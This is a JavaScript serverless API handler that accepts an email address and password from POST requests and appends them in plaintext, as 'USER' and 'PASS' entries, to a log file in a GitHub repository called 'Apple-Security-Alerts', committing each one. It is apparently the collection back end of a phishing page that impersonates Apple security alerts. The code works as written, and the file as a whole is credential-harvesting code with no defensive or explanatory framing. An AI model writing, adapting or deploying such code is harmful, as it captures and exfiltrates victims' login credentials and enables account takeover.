// /api/log.js
import { Octokit } from "@octokit/rest";

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).send('Method Not Allowed');

  const { email, password, timestamp } = req.body;
  const octokit = new Octokit({ auth: process.env.GH_TOKEN });

  try {
    // 1. Get the current content of the log file to get its SHA (required for updates)
    const { data: fileData } = await octokit.repos.getContent({
      owner: 'careed23',
      repo: 'Apple-Security-Alerts',
      path: 'activity_log.txt',
    });

    const currentContent = Buffer.from(fileData.content, 'base64').toString();
    const newEntry = `[${timestamp}] USER: ${email} | PASS: ${password}\n`;
    const updatedContent = currentContent + newEntry;

    // 2. Commit the change back to the repo
    await octokit.repos.createOrUpdateFileContents({
      owner: 'careed23',
      repo: 'Apple-Security-Alerts',
      path: 'activity_log.txt',
      message: `Log: Submission from ${email}`,
      content: Buffer.from(updatedContent).toString('base64'),
      sha: fileData.sha, // The "key" that proves we're updating the right version
    });

    res.status(200).json({ success: true });
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: 'Failed to log to GitHub' });
  }
}
